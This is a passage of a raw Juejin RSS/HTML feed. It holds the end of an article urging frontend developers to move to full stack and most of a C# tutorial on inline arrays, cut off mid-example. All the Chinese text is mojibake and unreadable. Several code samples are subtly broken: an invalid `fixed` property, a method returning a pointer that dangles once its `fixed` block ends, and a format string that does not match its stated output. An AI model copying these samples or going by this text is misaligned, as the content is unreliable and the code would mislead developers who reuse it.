<li>éƒ¨ç½²ç®€å•ï¼šå•æ–‡ä»¶éƒ¨ç½²ï¼Œèµ„æºå ç”¨å°‘</li>
<li>äº‘åŸç”Ÿå‹å¥½ï¼šDockerã€Kubernetes ç”Ÿæ€å®Œå–„</li>
</ul>
<p>é€‚ç”¨åœºæ™¯ï¼š</p>
<ul>
<li>é«˜å¹¶å‘æœåŠ¡</li>
<li>å¾®æœåŠ¡æ¶æ„</li>
<li>äº‘åŸç”Ÿåº”ç”¨</li>
<li>æ€§èƒ½æ•æ„Ÿåœºæ™¯</li>
</ul>
<p>å­¦ä¹ è·¯å¾„ï¼š</p>
<ol>
<li>Go åŸºç¡€ï¼ˆè¯­æ³•ã€å¹¶å‘æ¨¡å‹ï¼‰</li>
<li>Web æ¡†æ¶ï¼ˆGinã€Echoï¼‰</li>
<li>æ•°æ®åº“æ“ä½œï¼ˆGORMï¼‰</li>
<li>å¾®æœåŠ¡å¼€å‘</li>
</ol>
<h3 data-id="heading-13">4. æŠ€æœ¯æ ˆé€‰æ‹©å»ºè®®</h3>
<p>å¯¹äºå‰ç«¯è½¬å…¨æ ˆçš„å¼€å‘è€…ï¼š</p>
<ol>
<li>
<p>é¦–é€‰ Node.jsï¼šå¦‚æœç›®æ ‡æ˜¯å¿«é€Ÿè½¬å…¨æ ˆï¼ŒNode.js æ˜¯æœ€ä½³é€‰æ‹©</p>
<ul>
<li>å­¦ä¹ æˆæœ¬æœ€ä½</li>
<li>å‰åç«¯ä»£ç å¤ç”¨</li>
<li>é€‚åˆå¤§å¤šæ•° Web åº”ç”¨</li>
</ul>
</li>
<li>
<p>è€ƒè™‘ Pythonï¼šå¦‚æœä¸“æ³¨ AI é¡¹ç›®</p>
<ul>
<li>AI ç”Ÿæ€æœ€å®Œå–„</li>
<li>é€‚åˆå¤æ‚ AI é€»è¾‘</li>
<li>æ•°æ®ç§‘å­¦èƒ½åŠ›</li>
</ul>
</li>
<li>
<p>å­¦ä¹  Goï¼šå¦‚æœè¿½æ±‚æ€§èƒ½</p>
<ul>
<li>é«˜å¹¶å‘åœºæ™¯</li>
<li>å¾®æœåŠ¡æ¶æ„</li>
<li>äº‘åŸç”Ÿåº”ç”¨</li>
</ul>
</li>
</ol>
<p>å»ºè®®ï¼š</p>
<ul>
<li>ç¬¬ä¸€é˜¶æ®µï¼šé€‰æ‹© Node.jsï¼Œå¿«é€Ÿè½¬å…¨æ ˆ</li>
<li>ç¬¬äºŒé˜¶æ®µï¼šæ ¹æ®é¡¹ç›®éœ€æ±‚ï¼Œå­¦ä¹  Python æˆ– Go</li>
<li>é•¿æœŸç›®æ ‡ï¼šæŒæ¡å¤šç§æŠ€æœ¯æ ˆï¼Œæ ¹æ®åœºæ™¯é€‰æ‹©</li>
</ul>
<h2 data-id="heading-14">å››ã€æ€»ç»“</h2>
<p>AI æ—¶ä»£çš„åˆ°æ¥ï¼Œç»™å‰ç«¯å¸¦æ¥äº†æ·±åˆ»å†²å‡»ï¼š</p>
<ol>
<li>ä»£ç ç”Ÿæˆèƒ½åŠ›ï¼šä½å¤æ‚åº¦é¡µé¢ç”Ÿæˆè¢« AI æ›¿ä»£</li>
<li>ä¸šåŠ¡é€»è¾‘å‰ç§»ï¼šAI é¡¹ç›®éœ€è¦å‰åç«¯ä¸€ä½“åŒ–</li>
<li>æŠ€æœ¯è¾¹ç•Œæ¨¡ç³Šï¼šå‰åç«¯è¾¹ç•Œæ­£åœ¨æ¶ˆå¤±</li>
<li>èŒä¸šå¤©èŠ±æ¿ï¼šåªä¼šå‰ç«¯çš„å‰ç«¯å·¥ç¨‹å¸ˆï¼Œå‘å±•å—é™</li>
</ol>
<p>å‰ç«¯è½¬å…¨æ ˆï¼Œæ˜¯ AI æ—¶ä»£çš„å¿…ç„¶é€‰æ‹©ã€‚</p>
<p>å¯¹äºæŠ€æœ¯æ ˆé€‰æ‹©ï¼š</p>
<ul>
<li>Node.jsï¼šå‰ç«¯è½¬å…¨æ ˆçš„æœ€ä½³èµ·ç‚¹ï¼Œå­¦ä¹ æˆæœ¬ä½</li>
<li>Pythonï¼šAI é¡¹ç›®çš„é¦–é€‰ï¼Œç”Ÿæ€å®Œå–„</li>
<li>Goï¼šé«˜æ€§èƒ½åœºæ™¯çš„é€‰æ‹©ï¼Œäº‘åŸç”Ÿå‹å¥½</li>
</ul>
<p>æ­£å¦‚ç¾å›¢çš„å…¨æ ˆåŒ–å®è·µæ‰€ç¤ºï¼Œå…¨æ ˆå¼€å‘è¿˜ç›¸å¯¹é è°±ï¼Œå…³é”®åœ¨äºï¼š</p>
<ul>
<li>é€‰æ‹©åˆé€‚çš„æŠ€æœ¯æ ˆ</li>
<li>å»ºç«‹ä¸¥æ ¼çš„å¼€å‘æµç¨‹</li>
<li>æŒç»­å­¦ä¹ å’Œå®è·µ</li>
</ul>
<p>å¯¹äºå‰ç«¯å¼€å‘è€…æ¥è¯´ï¼ŒAI æ—¶ä»£æ—¢æ˜¯æŒ‘æˆ˜ï¼Œä¹Ÿæ˜¯æœºé‡ã€‚è½¬å…¨æ ˆï¼Œä¸ä»…èƒ½åº”å¯¹ AI å†²å‡»ï¼Œæ›´èƒ½æ‰“å¼€èŒä¸šå‘å±•çš„æ–°ç©ºé—´ã€‚é‚£äº›"å‰ç«¯å·²æ­»"çš„å£°éŸ³ï¼Œå…¶å®æ˜¯åœ¨æé†’æˆ‘ä»¬ï¼šåªæœ‰ä¸æ–­è¿›åŒ–ï¼Œæ‰èƒ½åœ¨è¿™ä¸ªæ—¶ä»£ç«‹è¶³ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ¬¡å¼„æ‡‚ C# å†…è”æ•°ç»„ï¼ˆInline Arrayï¼‰ï¼šé«˜æ€§èƒ½æ•°ç»„çš„æ–°é€‰æ‹©]]></title>    <link>https://juejin.cn/post/7581691182003896330</link>    <guid>https://juejin.cn/post/7581691182003896330</guid>    <pubDate>2025-12-09T23:37:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581691182003896330" data-draft-id="7581888578507046939" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ¬¡å¼„æ‡‚ C# å†…è”æ•°ç»„ï¼ˆInline Arrayï¼‰ï¼šé«˜æ€§èƒ½æ•°ç»„çš„æ–°é€‰æ‹©"/> <meta itemprop="keywords" content="C#,.NET"/> <meta itemprop="datePublished" content="2025-12-09T23:37:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å”é’æ«"/> <meta itemprop="url" content="https://juejin.cn/user/3737995266234280"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ¬¡å¼„æ‡‚ C# å†…è”æ•°ç»„ï¼ˆInline Arrayï¼‰ï¼šé«˜æ€§èƒ½æ•°ç»„çš„æ–°é€‰æ‹©
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3737995266234280/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å”é’æ«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T23:37:02.000Z" title="Tue Dec 09 2025 23:37:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ç®€ä»‹</h3>
<p>å†…è”æ•°ç»„æ˜¯ <code>C# 12</code> å’Œ <code>.NET 8</code> ä¸­å¼•å…¥çš„ä¸€ä¸ªé«˜çº§ç‰¹æ€§ï¼Œå®ƒå…è®¸å¼€å‘è€…åˆ›å»ºå›ºå®šå¤§å°çš„ã€åœ¨æ ˆä¸Šåˆ†é…æˆ–å†…è”åœ¨ç»“æ„ä½“ä¸­çš„æ•°ç»„ã€‚è¿™ä¸ªç‰¹æ€§ä¸»è¦ç”¨äºé«˜æ€§èƒ½åœºæ™¯ï¼Œå¯ä»¥é¿å…å †åˆ†é…å’Œåƒåœ¾å›æ”¶çš„å¼€é”€ã€‚</p>
<h4 data-id="heading-1">æ€§èƒ½ä¼˜åŠ¿</h4>
<p>å†…è”æ•°ç»„çš„ä¸»è¦ä¼˜åŠ¿åœ¨äºæ€§èƒ½ï¼š</p>
<ul>
<li>
<p>æ ˆä¸Šåˆ†é…ï¼šé¿å…å †åˆ†é…å’Œåƒåœ¾å›æ”¶</p>
</li>
<li>
<p>å†…å­˜å±€éƒ¨æ€§ï¼šå…ƒç´ åœ¨å†…å­˜ä¸­è¿ç»­å­˜å‚¨ï¼Œæé«˜ç¼“å­˜å‘½ä¸­ç‡</p>
</li>
<li>
<p>å‡å°‘æŒ‡é’ˆé—´æ¥å¯»å€ï¼šç›´æ¥è®¿é—®å…ƒç´ ï¼Œä¸éœ€è¦é€šè¿‡æ•°ç»„å¯¹è±¡å¼•ç”¨</p>
</li>
</ul>
<h4 data-id="heading-2">å†…è”æ•°ç»„ vs ä¼ ç»Ÿæ•°ç»„</h4>








































<table><thead><tr><th>ç‰¹æ€§</th><th>å†…è”æ•°ç»„</th><th>ä¼ ç»Ÿæ•°ç»„</th></tr></thead><tbody><tr><td>å†…å­˜ä½ç½®</td><td>æ ˆ/åŒ…å«ç»“æ„ä½“å†…å­˜</td><td>æ‰˜ç®¡å †</td></tr><tr><td>åˆ†é…å¼€é”€</td><td>æ— é¢å¤–åˆ†é…</td><td>éœ€è¦å †åˆ†é…</td></tr><tr><td>æœ€å¤§é•¿åº¦</td><td>å—æ ˆç©ºé—´é™åˆ¶ï¼ˆé€šå¸¸â‰¤1MBï¼‰</td><td>å—GCé™åˆ¶ï¼ˆé€šå¸¸â‰¤2GBï¼‰</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>é«˜æ€§èƒ½è®¡ç®—/åµŒå…¥å¼å¼€å‘</td><td>é€šç”¨åœºæ™¯</td></tr><tr><td>çµæ´»æ€§</td><td>å›ºå®šé•¿åº¦</td><td>åŠ¨æ€é•¿åº¦</td></tr><tr><td>C#ç‰ˆæœ¬è¦æ±‚</td><td>â‰¥ C# 12 (.NET 8+)</td><td>æ‰€æœ‰ç‰ˆæœ¬</td></tr></tbody></table>
<h3 data-id="heading-3">åŸºæœ¬è¯­æ³•</h3>
<p>å†…è”æ•°ç»„ä½¿ç”¨ <code>InlineArray</code> ç‰¹æ€§å’Œç‰¹å®šçš„æ¨¡å¼æ¥å®šä¹‰ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">using</span> System.Runtime.CompilerServices;

[<span class="hljs-meta">InlineArray(Size)</span>]
<span class="hljs-keyword">struct</span> InlineArrayStruct
{
    <span class="hljs-keyword">private</span> T _element; <span class="hljs-comment">// å•ä¸€å­—æ®µï¼Œè¡¨ç¤ºæ•°ç»„çš„èµ·ç‚¹</span>
}
</code></pre>
<ul>
<li>
<p><code>Size</code>ï¼šä¸€ä¸ªç¼–è¯‘æ—¶å¸¸é‡ï¼Œè¡¨ç¤ºæ•°ç»„çš„å›ºå®šé•¿åº¦ã€‚</p>
</li>
<li>
<p><code>T</code>ï¼šæ•°ç»„å…ƒç´ çš„ç±»å‹ï¼ˆå¯ä»¥æ˜¯å€¼ç±»å‹æˆ–å¼•ç”¨ç±»å‹ï¼‰ã€‚</p>
</li>
<li>
<p>å•ä¸€å­—æ®µï¼šç»“æ„ä½“ä¸­åªèƒ½æœ‰ä¸€ä¸ªå­—æ®µï¼Œè¡¨ç¤ºæ•°ç»„çš„èµ·ç‚¹ï¼Œç¼–è¯‘å™¨ä¼šå°†å…¶æ‰©å±•ä¸ºå›ºå®šå¤§å°çš„è¿ç»­å†…å­˜ã€‚</p>
</li>
</ul>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">System.Runtime.CompilerServices.InlineArray(10)</span>]
<span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> MyInlineArray
{
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> _element0; <span class="hljs-comment">// åªéœ€è¦å®šä¹‰ä¸€ä¸ªå­—æ®µï¼Œå®é™…å¤§å°ç”±ç‰¹æ€§æŒ‡å®š</span>
}
</code></pre>
<h3 data-id="heading-4">åˆ›å»ºå’Œä½¿ç”¨å†…è”æ•°ç»„</h3>
<h4 data-id="heading-5">åŸºæœ¬å®šä¹‰å’Œä½¿ç”¨</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">using</span> System;
<span class="hljs-keyword">using</span> System.Runtime.CompilerServices;

<span class="hljs-comment">// å®šä¹‰åŒ…å«10ä¸ªæ•´æ•°çš„å†…è”æ•°ç»„</span>
[<span class="hljs-meta">InlineArray(10)</span>]
<span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> IntArray10
{
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> _element0;
    
    <span class="hljs-comment">// å¯ä»¥æ·»åŠ æ–¹æ³•æˆ–å±æ€§æ¥å¢å¼ºåŠŸèƒ½</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Length =&gt; <span class="hljs-number">10</span>;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> <span class="hljs-title">Sum</span>()</span>
    {
        <span class="hljs-built_in">int</span> sum = <span class="hljs-number">0</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; Length; i++)
        {
            sum += <span class="hljs-keyword">this</span>[i];
        }
        <span class="hljs-keyword">return</span> sum;
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title">Program</span>
{
    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>()</span>
    {
        IntArray10 array = <span class="hljs-keyword">new</span> IntArray10();
        
        <span class="hljs-comment">// åˆå§‹åŒ–æ•°ç»„</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; array.Length; i++)
        {
            array[i] = i * <span class="hljs-number">2</span>;
        }
        
        <span class="hljs-comment">// è®¿é—®å…ƒç´ </span>
        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; array.Length; i++)
        {
            Console.WriteLine(<span class="hljs-string">$"array[<span class="hljs-subst">{i}</span>] = <span class="hljs-subst">{array[i]}</span>"</span>);
        }
        
        Console.WriteLine(<span class="hljs-string">$"æ€»å’Œ: <span class="hljs-subst">{array.Sum()}</span>"</span>);
    }
}
</code></pre>
<h4 data-id="heading-6">ä¸ <code>Span&lt;T&gt;</code> ç»“åˆ</h4>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">InlineArray(5)</span>]
<span class="hljs-keyword">struct</span> FloatBuffer
{
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">float</span> _element;
}

<span class="hljs-keyword">var</span> buffer = <span class="hljs-keyword">new</span> FloatBuffer();
buffer[<span class="hljs-number">0</span>] = <span class="hljs-number">1.5f</span>;
buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">2.5f</span>;

Span&lt;<span class="hljs-built_in">float</span>&gt; span = buffer;
Console.WriteLine(span[<span class="hljs-number">0</span>]); <span class="hljs-comment">// è¾“å‡º: 1.5</span>
Console.WriteLine(span.Length); <span class="hljs-comment">// è¾“å‡º: 5</span>
</code></pre>
<h4 data-id="heading-7">æ³›å‹å†…è”æ•°ç»„</h4>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">InlineArray(5)</span>]
<span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> GenericArray&lt;T&gt;
{
    <span class="hljs-keyword">private</span> T _element0;
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Length =&gt; <span class="hljs-number">5</span>;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Initialize</span>(<span class="hljs-params">T initialValue</span>)</span>
    {
        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; Length; i++)
        {
            <span class="hljs-keyword">this</span>[i] = initialValue;
        }
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
GenericArray&lt;<span class="hljs-built_in">string</span>&gt; stringArray = <span class="hljs-keyword">new</span> GenericArray&lt;<span class="hljs-built_in">string</span>&gt;();
stringArray.Initialize(<span class="hljs-string">"default"</span>);
</code></pre>
<h4 data-id="heading-8">åœ¨æ€§èƒ½æ•æ„Ÿåœºæ™¯ä¸­ä½¿ç”¨</h4>
<p>å†…è”æ•°ç»„é€‚åˆéœ€è¦æè‡´æ€§èƒ½çš„åœºæ™¯ï¼Œä¾‹å¦‚å¤„ç†å‘é‡æˆ–ç¼“å†²åŒºã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">InlineArray(3)</span>]
<span class="hljs-keyword">struct</span> Vector3D
{
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">float</span> _element;
}

<span class="hljs-function">Vector3D <span class="hljs-title">AddVectors</span>(<span class="hljs-params">Vector3D a, Vector3D b</span>)</span>
{
    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">new</span> Vector3D();
    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)
    {
        result[i] = a[i] + b[i];
    }
    <span class="hljs-keyword">return</span> result;
}

<span class="hljs-keyword">var</span> v1 = <span class="hljs-keyword">new</span> Vector3D { [<span class="hljs-number">0</span>] = <span class="hljs-number">1.0f</span>, [<span class="hljs-number">1</span>] = <span class="hljs-number">2.0f</span>, [<span class="hljs-number">2</span>] = <span class="hljs-number">3.0f</span> };
<span class="hljs-keyword">var</span> v2 = <span class="hljs-keyword">new</span> Vector3D { [<span class="hljs-number">0</span>] = <span class="hljs-number">4.0f</span>, [<span class="hljs-number">1</span>] = <span class="hljs-number">5.0f</span>, [<span class="hljs-number">2</span>] = <span class="hljs-number">6.0f</span> };
<span class="hljs-keyword">var</span> sum = AddVectors(v1, v2);

Console.WriteLine(<span class="hljs-string">$"(<span class="hljs-subst">{sum[<span class="hljs-number">0</span>]}</span>, <span class="hljs-subst">{sum[<span class="hljs-number">1</span>]}</span>, <span class="hljs-subst">{sum[<span class="hljs-number">2</span>]}</span>"</span>); <span class="hljs-comment">// è¾“å‡º: (5, 7, 9)</span>
</code></pre>
<ul>
<li>
<p><code>Vector3D</code> æ¨¡æ‹Ÿä¸€ä¸ªä¸‰ç»´å‘é‡ï¼Œå†…è”æ•°ç»„ç¡®ä¿å†…å­˜è¿ç»­ã€‚</p>
</li>
<li>
<p>é€‚åˆæ¸¸æˆå¼€å‘æˆ–ç§‘å­¦è®¡ç®—ã€‚</p>
</li>
</ul>
<h4 data-id="heading-9">ä¸æœ¬æœºä»£ç äº¤äº’</h4>
<p>å†…è”æ•°ç»„çš„è¿ç»­å†…å­˜å¸ƒå±€ä½¿å…¶éå¸¸é€‚åˆä¸æœ¬æœºä»£ç ï¼ˆå¦‚ <code>C/C++</code> ï¼‰äº¤äº’ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">using</span> System.Runtime.InteropServices;

[<span class="hljs-meta">InlineArray(8)</span>]
<span class="hljs-keyword">struct</span> CharBuffer
{
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">char</span> _element;
}

[<span class="hljs-meta">DllImport(<span class="hljs-string">"someNativeLib.dll"</span>)</span>]
<span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ProcessBuffer</span>(<span class="hljs-params"><span class="hljs-keyword">ref</span> CharBuffer buffer</span>)</span>;

<span class="hljs-keyword">var</span> buffer = <span class="hljs-keyword">new</span> CharBuffer();
buffer[<span class="hljs-number">0</span>] = <span class="hljs-string">'H'</span>;
buffer[<span class="hljs-number">1</span>] = <span class="hljs-string">'e'</span>;
buffer[<span class="hljs-number">2</span>] = <span class="hljs-string">'l'</span>;
buffer[<span class="hljs-number">3</span>] = <span class="hljs-string">'l'</span>;
buffer[<span class="hljs-number">4</span>] = <span class="hljs-string">'o'</span>;
ProcessBuffer(<span class="hljs-keyword">ref</span> buffer);
</code></pre>
<ul>
<li>
<p><code>CharBuffer</code> çš„å†…å­˜å¸ƒå±€ä¸ <code>C</code> è¯­è¨€ä¸­çš„ <code>char[8]</code> å…¼å®¹ã€‚</p>
</li>
<li>
<p>é€šè¿‡ <code>ref</code> ä¼ é€’ï¼Œç¡®ä¿æœ¬æœºä»£ç å¯ä»¥ç›´æ¥æ“ä½œå†…å­˜ã€‚</p>
</li>
</ul>
<h3 data-id="heading-10">é«˜çº§ç”¨æ³•</h3>
<h4 data-id="heading-11">ä¸ä¸å®‰å…¨ä»£ç ç»“åˆ</h4>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">InlineArray(8)</span>]
<span class="hljs-keyword">public</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">struct</span> DoubleArray
{
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">double</span> _element0;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">fixed</span> <span class="hljs-built_in">int</span> Length =&gt; <span class="hljs-number">8</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">double</span>* GetPointer()
    {
        <span class="hljs-keyword">fixed</span> (<span class="hljs-built_in">double</span>* ptr = &amp;<span class="hljs-keyword">this</span>[<span class="hljs-number">0</span>])
        {
            <span class="hljs-keyword">return</span> ptr;
        }
    }
}
</code></pre>
<h4 data-id="heading-12">æ¨¡æ‹Ÿå¤šç»´æ•°ç»„</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// ä½¿ç”¨ä¸€ç»´å†…è”æ•°ç»„æ¨¡æ‹ŸäºŒç»´æ•°ç»„</span>
[<span class="hljs-meta">InlineArray(16)</span>] <span class="hljs-comment">// 4x4 çŸ©é˜µ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> Matrix4x4
{
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">float</span> _element0;
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Rows =&gt; <span class="hljs-number">4</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Columns =&gt; <span class="hljs-number">4</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">float</span> <span class="hljs-keyword">this</span>[<span class="hljs-built_in">int</span> row, <span class="hljs-built_in">int</span> col]
    {
        <span class="hljs-keyword">get</span> =&gt; <span class="hljs-keyword">this</span>[row * Columns + col];
        <span class="hljs-keyword">set</span> =&gt; <span class="hljs-keyword">this</span>[row * Columns + col] = <span class="hljs-keyword">value</span>;
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Matrix4x4 <span class="hljs-title">Identity</span>()</span>
    {
        <span class="hljs-keyword">var</span> matrix = <span class="hljs-keyword">new</span> Matrix4x4();
        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)
        {
            matrix[i, i] = <span class="hljs-number">1.0f</span>;
        }
        <span class="hljs-keyword">return</span> matrix;
    }
}
</code></pre>
<h4 data-id="heading-13">ä¸ Span å’Œ Memory äº’æ“ä½œ</h4>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">InlineArray(100)</span>]
